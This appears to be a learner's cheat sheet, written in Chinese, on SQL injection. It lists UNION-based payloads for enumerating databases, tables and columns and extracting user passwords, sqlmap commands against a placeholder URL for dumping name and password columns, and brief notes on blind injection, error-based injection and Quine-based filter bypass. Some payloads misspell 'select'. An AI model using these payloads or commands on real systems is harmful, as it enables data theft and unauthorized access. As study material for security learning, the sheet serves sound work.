# SQL注入

### SQL基础
* RDBMS关系型数据库管理系统 库-表-列-行


### 注入
#### 有回显
* `SELECT first_name, last_name FROM users WHERE user_id = '` +`1' or '1234' = '1234` + `'` 有趣的事情发生了，这条注入后的查询语句可以查询所有id的用户
* `...` + `1' or 1=1 order by 3 #` + `'`猜解sql查询语句中的字段数,巧妙地使注入符合语法，以字段3排序，若失败则只有3-1=2列
* `1' union select 1,2 #` 联合查询
* `1' union select 1,database() #` 查询数据库名 
* `1' union selcet 1, group_concat(table_name) from information_schema.tables where table_schema=database() #` 查询当前数据库的表名
* `1'and 1=2 union selcet 1,group_concat(column_name) from information_schema.columns where table_name='users' #` 获取表中字段名，1=2使第一个查询失效，或者使用limit
* `1'and 1=2 union selcet group_concat(user_id, first_name, last_name),group_concat(password) from users #` 查询数据

* 报错注入构造错误信息获取内容
  * xpath
  * extractvalue()
#### sqlmap
* `sqlmap -h` 帮助文档
* `sqlmap -u http://xxx.com/1.php?id＝11 --dbs` 查看数据库名
* `sqlmap -u http://xxx.com/1.php?id＝11 --current-db` 当前数据库信息
* `sqlmap -u http://xxx.com/1.php?id＝11 -D a --tables` 当前数据库信息，'a' 为指定数据库名称
* `sqlmap -u http://xxx.com/1.php?id＝11 -D a -T admin --columns` 列出指定表名的所有列名，'admin' 为指定表名称
* `sqlmap -u http://xxx.com/1.php?id＝11 -D a -T admin -C name,password --dump` 输出表名指定列名字段的值数据，'name，password' 为指定字段名称

#### 无回显
* 布尔盲注-回显不同
* 时间盲注-响应时间不同
* 报错盲注


### 注入类型
#### 整型

#### 字符型

#### Quine
* 神奇的自产生程序
* 利用`replace`和Quine在sql注入中可以使得输入的数据和被重写的数据是一个值，用于绕过一些检测